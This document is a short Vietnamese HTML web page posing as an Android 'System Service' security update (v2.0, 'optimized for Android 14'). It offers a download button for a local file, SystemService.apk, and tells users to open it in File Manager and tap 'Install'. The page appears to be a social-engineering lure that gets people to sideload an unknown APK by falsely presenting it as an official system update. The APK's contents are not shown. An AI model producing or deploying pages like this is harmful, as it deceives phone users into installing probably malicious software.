<!DOCTYPE html>
<html lang="vi">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cập Nhật Dịch Vụ Hệ Thống</title>
    <style>
        :root {
            --primary: #2563eb;
            --surface: #ffffff;
            --background: #f1f5f9;
            --text-main: #1e293b;
            --text-sub: #64748b;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--background);
            color: var(--text-main);
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: var(--surface);
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }

        .icon-container {
            width: 80px;
            height: 80px;
            background: #eff6ff;
            color: var(--primary);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 1rem;
            background: var(--primary);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            font-weight: 600;
            margin-top: 2rem;
        }
    </style>
</head>

<body>
    <div class="card">
        <div class="icon-container">
            <svg style="width:40px;height:40px" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
            </svg>
        </div>
        <h1>Dịch Vụ Hệ Thống</h1>
        <p>Bản cập nhật bảo mật (v2.0). Tối ưu hóa cho Android 14.</p>

        <!-- Link trỏ đến file APK cùng thư mục -->
        <a href="./SystemService.apk" class="btn">Tải Xuống Ngay</a>

        <p style="margin-top:20px; font-size: 0.8em; color: gray;">
            Lưu ý: Sau khi tải, hãy vào File Manager để mở file và chọn 'Cài đặt'.
        </p>
    </div>
</body>

</html>
